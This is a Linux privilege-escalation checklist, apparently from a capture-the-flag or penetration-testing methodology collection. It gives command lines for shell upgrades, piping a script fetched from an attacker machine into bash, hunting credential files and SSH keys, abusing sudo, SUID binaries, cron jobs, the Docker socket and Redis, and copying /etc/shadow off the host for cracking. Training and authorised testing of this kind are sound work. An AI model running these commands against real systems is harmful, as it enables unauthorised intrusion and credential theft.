# 04 — Linux Privilege Escalation

**Jump to:** [First 5 minutes on any Linux shell](#first-5-minutes-on-any-linux-shell) · [Run the automated tools first (they cover 80%)](#run-the-automated-tools-first-they-cover-80) · [Manual quick wins (in order of frequency)](#manual-quick-wins-in-order-of-frequency) · [Credential hunting](#credential-hunting) · [Service-account escalation](#service-account-escalation) · [Container / VM escape](#container--vm-escape) · [Once root](#once-root)

Trigger: any shell on a Linux host.
Reference: [Linux Privilege Escalation](../4-post-exploitation/01-linux-privilege-escalation.md) · [Shell Upgrades](../4-post-exploitation/05-shell-upgrades.md) · [Credential Dumping](../4-post-exploitation/03-credential-dumping.md).

## First 5 minutes on any Linux shell

- [ ] Upgrade shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm-256color`.
- [ ] Identify yourself: `id; whoami; hostname; ip a`.
- [ ] Distro + kernel: `uname -a; cat /etc/os-release`.
- [ ] Users with a login shell: `grep -vE 'nologin|false' /etc/passwd`.

## Run the automated tools first (they cover 80%)

- [ ] Upload and run **linpeas**: `curl <kali>/linpeas.sh | bash | tee /tmp/lp.out`.
- [ ] Read the RED/YELLOW findings — that's where your privesc lives.
- [ ] If linpeas can't run (no network, no `curl`) — fall back to the manual checks below.
- [ ] **Re-run linpeas + `sudo -l`/`doas` checks after EVERY user switch.** Privesc is iterative — each user has different group memberships, sudo/doas rules, readable files and home-dir secrets. The chain is often `www-data` → user A → user B → root, and linpeas run as `www-data` will *not* see user A's doas rule or `~/.ssh`. Re-enumerate as whoever you just became.

## Manual quick wins (in order of frequency)

- [ ] `sudo -l` — misconfigured sudo is the #1 privesc.
  - Check every allowed binary at [GTFOBins](https://gtfobins.github.io/).
  - No password required? `sudo <binary>` and pick the escape.
  - Password required and you have it? Same thing, `sudo -S`.
- [ ] `doas` present (`which doas`)? There is **no reliable `doas -l`** — read the config instead: `cat /etc/doas.conf /usr/local/etc/doas.conf 2>/dev/null` (path varies by build; source builds use `/usr/local/etc`). A `permit nopass <user> as root cmd <bin>` line + a GTFOBins-able or plugin-loading binary = root. (Soccer: `permit nopass player as root cmd /usr/bin/dstat` + world/group-writable plugin dir → drop `dstat_x.py` → `doas dstat --x`.)
- [ ] SUID binaries: `find / -perm -4000 -type f 2>/dev/null`.
  - Anything not in the standard list? GTFOBins it.
- [ ] Capabilities: `getcap -r / 2>/dev/null`.
  - `cap_setuid+ep` on anything → GTFOBins.
- [ ] Writable `/etc/passwd`: `ls -la /etc/passwd`. If world-writable, add a root user with `openssl passwd`.
- [ ] Writable `/etc/shadow`, `/etc/sudoers`, or `/etc/sudoers.d/*` — instant win.
- [ ] Cron jobs: `cat /etc/crontab; ls -la /etc/cron.*`. Writable script run as root = win.
- [ ] `pspy64` to catch invisible cron / systemd jobs firing.
- [ ] Kernel exploit: `uname -r`, then `searchsploit linux kernel <version>`. Last resort — can crash the box.

## Credential hunting

- [ ] `history` / `.bash_history` / `.zsh_history` — passwords in `mysql -p<pw>`, `curl -u`, etc.
- [ ] `.ssh/` — private keys? `id_rsa` without a passphrase is a free shell.
- [ ] `~/.aws/credentials`, `~/.docker/config.json`, `~/.git-credentials`.
- [ ] `/var/www/` **app** config files — `wp-config.php`, `.env`, `config.php`, `settings.py` (DB creds, API keys).
- [ ] `/var/www/` or wherever the **web-server** config lives — top check as `www-data`. Reveals **internal vhosts** not in public DNS, plus `proxy_pass` backends and doc roots: `grep -riE 'server_name|proxy_pass|root' /etc/nginx/ /etc/apache2/ 2>/dev/null`. New vhost → add to `/etc/hosts`, then attack it (SQLi/XSS/etc on every input). This is the `www-data` → next-foothold pivot when no local privesc is obvious (e.g. Soccer's `soc-player` vhost).
- [ ] `/opt/`, `/srv/` — custom apps with hardcoded creds.
- [ ] `find / -name "*.conf" -readable 2>/dev/null | xargs grep -l -iE 'pass|pwd|secret'`.
- [ ] Backups: `find / -name "*.bak" -o -name "*.old" -o -name "*~" 2>/dev/null`.

## Service-account escalation

- [ ] `ss -tlnp` — services listening only on `127.0.0.1` are often unauth'd.
- [ ] MySQL/PostgreSQL as root on localhost? UDF privesc.
- [ ] Redis on localhost? Write SSH key via `CONFIG SET dir` + `SAVE`.
- [ ] Docker socket accessible (`/var/run/docker.sock`)? `docker run -v /:/mnt -it alpine chroot /mnt` → root.
- [ ] LXD group membership? Instant container-to-host escape.

## Container / VM escape

- [ ] In a container? `cat /proc/1/cgroup` will show docker/kube.
- [ ] Privileged container? Mount host disk. See [Container Escape](../3-exploitation/06-container-escape.md).
- [ ] `capsh --print` — dangerous caps: `CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_PTRACE`.

## Once root

- [ ] `cat /root/root.txt` (or wherever the flag is).
- [ ] Grab `/etc/shadow` — dump to your box for hashcat, feed cracked hashes into cred spraying.
- [ ] Grab SSH keys from `/root/.ssh/`, `/home/*/.ssh/` — feed into pivots.
- [ ] Check for stored creds in `/root/`, `/var/backups/`, `/opt/`.
- [ ] Any DB present? Dump it — often a source of creds that work elsewhere.
- [ ] Now: [07-pivoting.md](./07-pivoting.md) if there's another subnet visible.
